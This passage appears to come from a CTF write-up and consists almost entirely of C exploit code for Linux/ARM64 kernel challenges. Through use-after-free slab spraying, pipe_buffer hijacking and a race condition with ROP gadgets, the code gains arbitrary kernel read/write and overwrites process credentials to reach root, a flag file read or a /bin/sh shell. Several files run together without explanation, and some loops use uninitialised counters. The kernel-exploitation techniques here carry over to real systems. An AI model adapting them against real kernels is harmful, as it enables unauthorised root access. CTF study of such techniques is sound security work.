    memset((char *)&buf[real_cred_offset], 0, 0x28);
    print_addr("real_cred_offset", real_cred_offset);

    arbitrary_write_by_pipe((struct page*) real_cred_page_addr, buf, 0xff0);
    // arbitrary_write_by_pipe((struct page*) (current_task_page+0x40),
    //                         &buf[512], 0xff0);
    printf("==============after overwrite=========");
    memset(buf, 0, 0x1000);
    arbitrary_read_by_pipe((struct page*) real_cred_page_addr, buf);
    print_binary(buf, 0x1000);

    puts("[+] Done.n");
    puts("[*] checking for root...");

    get_root_shell();
}

int main(){
    char buffer[0x1000] = {0};

    setbuf(stdout, NULL);

    if (fork() == 0)
    {
        // Exit after main process end.
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);

        // Consume the Redundant slabs
        for (int i = 0; i < sizeof(pipe_fd)/8; i++)
        {
            pipe(pipe_fd[i]);
            fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 8);
        }

        while(1)
            sleep(-1);
    }

    // Wait for child
    sleep(1);
    for (int i = 0; i < 21; i++)
    {
        new_buffer(i);
    }
    for (int i = 0; i < 21; i++)
    {
        del_buffer(i);
    }

    // pause();

    // Spray slabs
    for (int i = 0; i < sizeof(pipe_fd)/8; i++)
    {
        pipe(pipe_fd[i]);
        fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 8);
        write(pipe_fd[i][1], "bsdhenry", 8);
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], "bsdhenry", 8);
        write(pipe_fd[i][1], "bsdhenry", 8);  /* prevent pipe_release() */
    }

    /* Step.2 Leak kernel_addr by anon_pipe_buf_ops */
    int uaf_pipe_idx = 0;
    output_msg("Leak kernel_addr");
    for (int i; i < 21; i++)
    {
        show_buffer(i, buffer, 0x100);
        if ((*(size_t *)&buffer[0x10] & 0xfff) == 0x6a8){
            uaf_pipe_idx = i;
            kernel_offset = *(size_t *)&buffer[0x10] - 0xffffffc00a1506a8;
            kernel_base += kernel_offset;
            print_addr("kernel_offset", kernel_offset);
            print_addr("kernel_base", kernel_base);
            printf("[*] uaf_pipe_idx == %dn", uaf_pipe_idx);
            break;
        }
    }

    /* Step.3 Construct first level page UAF*/
    size_t page_1st = 0, page_2nd = 0;
    int origin_idx = 0, victim_idx = 0;
    memset(buffer, 0, 0x100);
    for(int i = 0; i < 21; i++){
        show_buffer(i, buffer, 0x100);
        if ((*(size_t *)&buffer[0x10] & 0xfff) == 0x6a8){
            if (!page_1st) {page_1st = *(size_t *)&buffer[0]; origin_idx = i;}
            else if(!page_2nd) {page_2nd = *(size_t *)&buffer[0]; victim_idx = i;}
            else break;
        }
    }
    print_addr("page_1st", page_1st);
    print_addr("page_2nd", page_2nd);
    printf("[*] origin_idx = %dn", origin_idx);
    printf("[*] victim_idx = %dn", victim_idx);
    // set victim page point to uaf page
    show_buffer(victim_idx, buffer, 0x100);
    *(size_t *)&buffer[0] = page_1st;
    edit_buffer(victim_idx, buffer, 0x100);
    memcpy(&info_pipe_buf, buffer, sizeof(struct pipe_buffer));

    print_binary(&info_pipe_buf, sizeof(struct pipe_buffer));
    printf(" 33[34m 33[1m[?] info_pipe_buf->page:  33[0m%pn" 
           " 33[34m 33[1m[?] info_pipe_buf->ops:  33[0m%pn", 
           info_pipe_buf.page, info_pipe_buf.ops);

    if ((size_t) info_pipe_buf.page < 0xffffff0000000000
        || (size_t) info_pipe_buf.ops < 0xffffffc008000000) {
        err_msg("FAILED to find info_pipe_buf!");
    }

    puts("[*] checking for corruption...");
    for (int i = 0; i < sizeof(pipe_fd)/8; i++) {
        char bsd_str[0x10];
        int nr;

        memset(bsd_str, ' ', sizeof(bsd_str));
        read(pipe_fd[i][0], bsd_str, 8);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!strcmp(bsd_str, "bsdhenry") && nr != i) {
            orig_pid = nr;
            victim_pid = i;
            printf(" 33[32m 33[1m[+] Found victim:  33[0m%d "
                   " 33[32m 33[1m, orig:  33[0m%dnn", 
                   victim_pid, orig_pid);
            break;
        }
    }

    if (victim_pid == -1) err_msg("Fail to hit uaf pipe page");

    /* step.4 Corrupting_second_level_pipe_for_pipe_uaf */
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
    printf("the sizeof(struct pipe_buffer) = %ldn", sizeof(struct pipe_buffer));

    memset(buffer, 0, sizeof(buffer));
    /* let the page's ptr at pipe_buffer */

    // free orignal pipe's page
    puts("[*] free original pipe...");
    close(pipe_fd[orig_pid][0]);
    close(pipe_fd[orig_pid][1]);

    for (int i; i < 3; i++)
    {
        show_buffer(i, buffer, 0x100);
        printf("==========buffer[%d]===========n", i);
        print_binary(buffer, 0x100);
    }

    /* try to rehit victim page by reallocating pipe_buffer */
    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    for (int i = 0; i < sizeof(pipe_fd)/8; i++) {
        if (i == orig_pid || i == victim_pid) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!n", i);
            err_msg("FAILED to re-alloc pipe_buffer!");
        }
    }
    
    /* step.5 Building_self_writing_pipe */
    struct pipe_buffer evil_pipe_buf;
    struct page *page_ptr;

    puts("[*] hijacking the 2nd pipe_buffer on page to itself...");
    evil_pipe_buf.page = info_pipe_buf.page;
    evil_pipe_buf.offset = 0x100;           // sizeof(pipe_buffer) = 0x80
    evil_pipe_buf.len = 0x100;
    evil_pipe_buf.ops = info_pipe_buf.ops;
    evil_pipe_buf.flags = info_pipe_buf.flags;
    evil_pipe_buf.private = info_pipe_buf.private;

    show_buffer(victim_idx, buffer, 0x100);
    *(size_t *)&buffer[8] = 0x10000000000;  // set offset = 0x0; len = 0x100
    edit_buffer(victim_idx, buffer, 0x100);

    show_buffer(victim_idx, buffer, 0x100);
    print_binary(buffer, 0x100);
    printf("======================n");
    // memset(buffer, 'a', 0x200);
    write(pipe_fd[victim_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));
    memset(buffer, ' ', 0x100);
    read(pipe_fd[victim_pid][0], buffer, 0x100);
    print_binary(buffer, 0x100);
    printf("======================n");
    show_buffer(victim_idx, buffer, 0x100);
    print_binary(buffer, 0x100);

    /* check for third-level victim pipe */
    for (int i = 0; i < sizeof(pipe_fd)/8; i++) {
        if (i == orig_pid || i == victim_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        print_binary(&page_ptr, 0x8);
        if (page_ptr == evil_pipe_buf.page) {
            self_2nd_pipe_pid = i;
            printf(" 33[32m 33[1m[+] Found self-writing pipe:  33[0m%dn", 
                    self_2nd_pipe_pid);
            break;
        }
    }
    if (self_2nd_pipe_pid == -1) {
        err_msg("FAILED to build a self-writing pipe!");
    }

    puts("[*] hijacking the 3rd pipe_buffer on page to itself...");
    evil_pipe_buf.offset = 0x100;
    evil_pipe_buf.len = 0x80;
    memset(buffer, 0, 0x100);
    write(pipe_fd[victim_pid][1], buffer, 0x80-sizeof(evil_pipe_buf));
    write(pipe_fd[victim_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < sizeof(pipe_fd)/8; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == self_2nd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_3rd_pipe_pid = i;
            printf(" 33[32m 33[1m[+] Found another self-writing pipe: 33[0m"
                    "%dn", self_3rd_pipe_pid);
            break;
        }
    }

    if (self_3rd_pipe_pid == -1) {
        err_msg("FAILED to build a self-writing pipe!");
    }

    puts("[*] hijacking the 4th pipe_buffer on page to itself...");
    evil_pipe_buf.offset = 0x100;
    evil_pipe_buf.len = 0x80;

    memset(buffer, 0, 0x100);
    write(pipe_fd[victim_pid][1], buffer, 0x80-sizeof(evil_pipe_buf));
    write(pipe_fd[victim_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < sizeof(pipe_fd)/8; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_4th_pipe_pid = i;
            printf(" 33[32m 33[1m[+] Found another self-writing pipe: 33[0m"
                    "%dn", self_4th_pipe_pid);
            break;
        }
    }

    if (self_4th_pipe_pid == -1) {
        err_msg("FAILED to build a self-writing pipe!");
    }

    info_leaking_by_arbitrary_pipe();

    privilege_escalation_by_task_overwrite();   
    // for (int i; i < 3; i++)
    // {
    //     show_buffer(i, buffer, 0x100);
    //     printf("==========buffer[%d]===========n", i);
    //     print_binary(buffer, 0x100);
    // }

    pause();

    return 0;
}
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <syscall.h>
    #include 
    #include <fcntl.h>
    #include <signal.h>
    #include <errno.h>
    #include <sys/mman.h>
    #include <sys/prctl.h>

    #define __NR_uaf 602

    #define VMEMMAP_BASE 0xff00000000000000
int this_pid = 0;

    #define new_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|0)
    #define del_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|1)
    #define show_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|2)
    #define edit_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|3)
    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}

int print_hex(void *p, int size)
{
    int i;
    unsigned char *buf = (unsigned char *)p;
    
    if(size % sizeof(void *))
    {
        return 1;
    }
    printf("--------------------------------------------------------------------------------n");
    for (i = 0; i < size; i += sizeof(void *))
    {
        printf("0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lxn", 
                i, buf[i+0], buf[i+1], buf[i+2], buf[i+3], buf[i+4], buf[i+5], buf[i+6], buf[i+7], *(unsigned long*)&buf[i]);
    }
    return 0;
}

int pipe_fd[500][2];
int index_pipe = -1, index_gst1 = -1;

int hijack_pipe_buffer()
{
    char buf[0x1000] = {0};
    int consume_fd[104];

    #define PIPE_NUM 450
    #define PTMX_NUM 600

    // Initial
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
        {
            perror("pipe");
            exit(EXIT_FAILURE);
        }
    }

    // Consume the Redundant slabs
    for (int i = 0; i < PTMX_NUM / 2; i++)
    {
        consume_fd[i] = open("/dev/ptmx", O_RDONLY);
        if (consume_fd[i] < 0)
        {
            perror("open");
            exit(EXIT_FAILURE);
        }
    }
    // Put the UAF slabs
    for (int i = 0; i < 21; i++)
    {
        new_buffer(i);
    }

    // Free the Redundant slabs
    for (int i = 0; i < PTMX_NUM / 2; i++)
    {
        close(consume_fd[i]);
    }
    // Free the UAF slabs
    for (int i = 0; i < 21; i++)
    {
        del_buffer(i);
    }

    // Spray slabs
    for (int i = 0; i < PIPE_NUM; i++)
    {
        fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 8);
    }

    // Find the slab
    for (int i = 0; i < PIPE_NUM; i++)
    {
        memset(buf, 0x61, sizeof(buf));
        write(pipe_fd[i][1], buf, 0x800);
        for (int j = 0; j < 21; j++)
        {
            memset(buf, 0, sizeof(buf));
            show_buffer(j, buf, 0x28);
            if (*(size_t*)(buf + 8) == 0x80000000000)
            {
                index_pipe = i;
                index_gst1 = j;
                break;
            }
        }
        
        if (index_pipe != -1 || index_gst1 != -1)
        {
            break;
        }
    }

    if (index_pipe == -1 || index_gst1 == -1)
    {
        printf("Error: index not foundn");
        exit(EXIT_FAILURE);
    }

    printf("Found index_pipe: %d, index_gst1:%dn", index_pipe, index_gst1);

    print_hex(buf, 0x28);
}

struct pipe_buffer
{
    size_t page;
    unsigned int offset;
    unsigned int len;
};

size_t read_word(size_t addr)
{
    struct pipe_buffer pi;
    size_t reuslt;
    pi.page = VMEMMAP_BASE + (((addr & (~0xfff)) - 0) / 0x1000) * 0x40;
    pi.len = 0x1000;
    pi.offset = addr & 0xfff;
    edit_buffer(index_gst1, &pi, sizeof(pi));
    read(pipe_fd[index_pipe][0], &reuslt, 0x8);
    return reuslt;
}

void write_word(size_t addr, size_t value)
{
    struct pipe_buffer pi;
    pi.page = VMEMMAP_BASE + (((addr & (~0xfff)) - 0) / 0x1000) * 0x40;
    pi.len = addr & 0xfff;
    pi.offset = 0;
    edit_buffer(index_gst1, &pi, sizeof(pi));
    write(pipe_fd[index_pipe][1], &value, 0x8);
}

    #define INIT_TASK 0xffffffc00ab51480
    #define TASK_PID_OFFSET 0x5d8
    #define NEXT_TASK_OFFSET 0x4d0
    #define PREV_TASK_OFFSET (NEXT_TASK_OFFSET+8)
    #define TASK_PTR_CRED_OFFSET 0x790

size_t get_current_task()
{
    size_t init_task = INIT_TASK, task = init_task;
    size_t result = 0;
    int pid = 0;
    int i = 0;

    while(result == 0 && i++ < 128)
    {
        task = read_word(task + PREV_TASK_OFFSET) - (NEXT_TASK_OFFSET);
        printf("task: 0x%lxn", task);
        if(task == init_task)
        {
            break;
        }
        pid = read_word(task + TASK_PID_OFFSET);
        if(pid == this_pid) // "exp"
        {
            result = task;
        }
    }

    return result;
}

void exploit()
{
    size_t current_task = 0, current_cred = 0;

    hijack_pipe_buffer();

    current_task = get_current_task();
    printf("current_task: 0x%lxn", current_task);
    current_cred = read_word(current_task + TASK_PTR_CRED_OFFSET);
    printf("current_cred: 0x%lxn", current_cred);

    // Modify UID
    for (int i = 0; i < 0x20; i += 8)
    {
        write_word(current_cred + i, 0);
    }
}

int readflag()
{
    int fd = 0;
    char buf[0x100];
    int result;

    fd = open("/system/flag", O_RDONLY);
    if(fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0, sizeof(buf));
    result = read(fd, buf, sizeof(buf)-1);
    printf("result: %dn", result);
    write(STDOUT_FILENO, buf, result);

    close(fd);

    return 0;
}

int main()
{
    setbuf(stdout, NULL);

    this_pid = getpid();
    printf("Start, pid = %d (0x%x)n", this_pid, this_pid);

    exploit();

    printf("Current uid: %dn", getuid());
    
    readflag();

    puts("End");

    return 0;
}
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include 
    #include <fcntl.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <sched.h>
    #include <stdint.h>
    #include 
    #include <linux/keyctl.h>

    #define __NR_race 604

    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}

// #define DB_STACK_ADDR 0xfffffe0000010f30

typedef struct mystruct {
    size_t  size;
    char buffer[0];
}mystruct;

size_t race(mystruct *userkey, char *buffer, unsigned long len, char *userhmac){
    return syscall(__NR_race, userkey, buffer, len, userhmac);
}

void err_msg(char *msg)
{
    printf(" 33[31m 33[1m[!] %s  33[0mn",msg);
    exit(0);
}
void output_msg(char *msg)
{
    printf(" 33[34m 33[1m[+] %s  33[0mn",msg);
}
void print_addr(char *msg, size_t value)
{
    printf(" 33[35m 33[1m[*] %s == %p 33[0mn",msg,(size_t *)value);
}
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    output_msg("Process binded to core");
}

int status = 1;
char buf_userkey[0x1000];
char hmac[20] = {0};
char ptext[0x1000] = {0};
mystruct *userkey = buf_userkey;

pthread_t raceFunc;
size_t core_pattern = 0xFFFFFF8008DEE930;
size_t selinux_enforcing = 0xFFFFFF8008EDA770;
size_t gadget_write = 0xFFFFFF8008131E60;
//ldr x0, [x0, #0x100] ; ret
size_t gadget_read = 0xffffff8008099fcc;
size_t cryptoctx_getbits = 0xFFFFFF80080DB018;
size_t bss = 0xFFFFFF8008E92200;
size_t work_for_cpu_fn = 0xFFFFFF80080D000C;
size_t selnl_notify_setenforce = 0xFFFFFF80083EF928;
size_t selinux_status_update_setenforce = 0xFFFFFF80083FF540;
/*
.kernel:
FFFFFF8008707744                 LDRB            W8, [X0,#0x311]
.kernel:
FFFFFF8008707748                 MOV             X19, X0
.kernel:
FFFFFF800870774C                 ADD             X29, SP, #0x10
.kernel:
FFFFFF8008707750                 CBZ             W8, loc_FFFFFF8008707774
.kernel:
FFFFFF8008707754                 LDR             X8, [X19,#0x338]
.kernel:
FFFFFF8008707758                 CBZ             X8, loc_FFFFFF8008707764
.kernel:
FFFFFF800870775C                 ADD             X0, X19, #0x318
.kernel:
FFFFFF8008707760                 BLR             X8
 */
size_t mov_x19_gadget = 0xFFFFFF8008707744;
/*
.kernel:
FFFFFF80080DB3F8                 LDR             X8, [X19,#0xC8]
.kernel:
FFFFFF80080DB3FC                 MOV             X0, X22
.kernel:
FFFFFF80080DB400                 MOV             X1, X21
.kernel:
FFFFFF80080DB404                 MOV             X2, X20
.kernel:
FFFFFF80080DB408                 BLR             X8
.kernel:
FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
.kernel:
FFFFFF80080DB410                 MOV             X20, X0
.kernel:
FFFFFF80080DB414                 MOV             X0, X19
.kernel:
FFFFFF80080DB418                 BLR             X8
.kernel:
FFFFFF80080DB41C                 SXTW            X0, W20
.kernel:
FFFFFF80080DB420
.kernel:
FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
.kernel:
FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
.kernel:
FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
.kernel:
FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
.kernel:
FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
.kernel:
FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
.kernel:
FFFFFF80080DB434                 RET
*/
size_t gadget2 = 0xFFFFFF80080DB3F8;
size_t ret = 0xFFFFFF80080DB434;
/*
.kernel:
FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
.kernel:
FFFFFF80080DB410                 MOV             X20, X0
.kernel:
FFFFFF80080DB414                 MOV             X0, X19
.kernel:
FFFFFF80080DB418                 BLR             X8
.kernel:
FFFFFF80080DB41C                 SXTW            X0, W20
.kernel:
FFFFFF80080DB420
.kernel:
FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
.kernel:
FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
.kernel:
FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
.kernel:
FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
.kernel:
FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
.kernel:
FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
.kernel:
FFFFFF80080DB434                 RET
*/
size_t gadget3 = 0xFFFFFF80080DB40C;
//
size_t mov_x0_zero = 0xffffff800809cc8c;
    #define INIT_TASK 0xFFFFFF8008DBAF80
    #define TASK_OFFSET 0x4a8
    #define PID_OFFSET 0x5a8
    #define PTR_CRED_OFFSET 0x748

void competeFunc() {
    while(status) {
        // printf("I'm child threadn");
        userkey->size = 0x10;
    }
}

size_t exec_func(size_t func,size_t arg,int check_ret,int ret_val) {
    *(size_t *)&userkey->buffer[0x10] = cryptoctx_getbits;
    *(size_t *)&userkey->buffer[0x18] = mov_x19_gadget;

    status = 1;
    if (pthread_create(&raceFunc,NULL,competeFunc,NULL) < 0){
        err_msg("Fail to create threadn");
    }
    
    size_t t0 = time(NULL);
    size_t ret = 0;
    while (1) {
        *(char *)(ptext + 0x311) = 1;
        *(size_t *)(ptext + 0x338) = gadget2;

        *(size_t *)(ptext + 0xc8) = mov_x0_zero;
        *(size_t *)(ptext + 0xd0) = work_for_cpu_fn;

        *(size_t *)(ptext + 0x20) = func;
        *(size_t *)(ptext + 0x28) = arg;

        userkey->size = 0x20;
        race(userkey, ptext, 0x340, hmac);
        if (check_ret) {
            if (*(size_t *)(ptext + 0x30) >> 48 == ret_val) {
                ret = *(size_t *)(ptext + 0x30);
                break;
            }
        } else {
            //不能判断是否竞争成功，直接每个运行6秒
            if (time(NULL) - t0 > 6) {
                break;
            }
        }
    }
    status = 0;
    return ret;
}
size_t read_qword(size_t addr,size_t check_val) {
    *(size_t *)&userkey->buffer[0x10] = cryptoctx_getbits;
    *(size_t *)&userkey->buffer[0x18] = mov_x19_gadget;

    status = 1;
    if (pthread_create(&raceFunc,NULL,competeFunc,NULL) < 0){
        err_msg("Fail to create threadn");
    }
    
    size_t t0 = time(NULL);
    size_t ret = 0;
    while (1) {
        *(char *)(ptext + 0x311) = 1;
        *(size_t *)(ptext + 0x338) = gadget2;

        *(size_t *)(ptext + 0xc8) = mov_x0_zero;
        *(size_t *)(ptext + 0xd0) = work_for_cpu_fn;

        *(size_t *)(ptext + 0x20) = gadget_read;
        *(size_t *)(ptext + 0x28) = addr - 0x100;

        userkey->size = 0x20;
        race(userkey, ptext, 0x340, hmac);
        
        if ((*(size_t *)(ptext + 0x30) >> 48) == check_val) {
            ret = *(size_t *)(ptext + 0x30);
            break;
        }
    }
    status = 0;
    return ret;
}
void write_qword(size_t addr,size_t val) {
    *(size_t *)&userkey->buffer[0x10] = cryptoctx_getbits;
    *(size_t *)&userkey->buffer[0x18] = mov_x19_gadget;
    
    status = 1;
    if (pthread_create(&raceFunc,NULL,competeFunc,NULL) < 0){
        err_msg("Fail to create threadn");
    }
    
    size_t t0 = time(NULL);
    while (1) {
        *(char *)(ptext + 0x311) = 1;
        *(size_t *)(ptext + 0x338) = gadget3;
        *(size_t *)(ptext + 0xd0) = gadget_write;

        *(size_t *)(ptext + 0x20) = addr;
        *(size_t *)(ptext + 0) = val;

        userkey->size = 0x20;
        race(userkey, ptext, 0x340, hmac);
        //不能判断是否竞争成功，直接每个运行6秒
        if (time(NULL) - t0 > 6) break;
    }
    status = 0;
}

size_t get_current_task() {
    size_t task = INIT_TASK;
    size_t result = 0;
    int i = 0;
    int pid;
    int current_task_pid = getpid();

    while(result == 0 && i++ < 1000) {
        task = read_qword(task + TASK_OFFSET,0xffff) - TASK_OFFSET;
        printf("task: %#lxn", task);
        if(task == INIT_TASK) {
            break;
        }
        pid = read_qword(task + PID_OFFSET,0) & 0xFFFFFFFF;
        printf("pid: %dn", pid);
        if(pid == current_task_pid) {
            result = task;
        }
    }

    return result;
}

int main(){
    int ret;
    bind_core(0);

    memcpy(userkey->buffer, "1234567890abcdef", 0x10);
    memcpy(ptext, "This is a test message. ", 0x20);
    size_t current_task = get_current_task();
    printf("current_task_addr=0x%lxn",current_task);
    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET,0xffff);
    printf("current_cred: 0x%lxn", current_cred);
    for(int i = 0; i < 8; i ++) {
        //gadget的val不能为0，所以错位写入0
        write_qword(current_cred + 4 + i * 4, 0xFFFFFFFF00000000);
    }
    system("/bin/sh");

    return 0;}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1730807096.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730807097.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1730807099.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1730807099.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730807101.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730807101.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1730807102.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730807103.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/4-1730807103.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1730807104.png)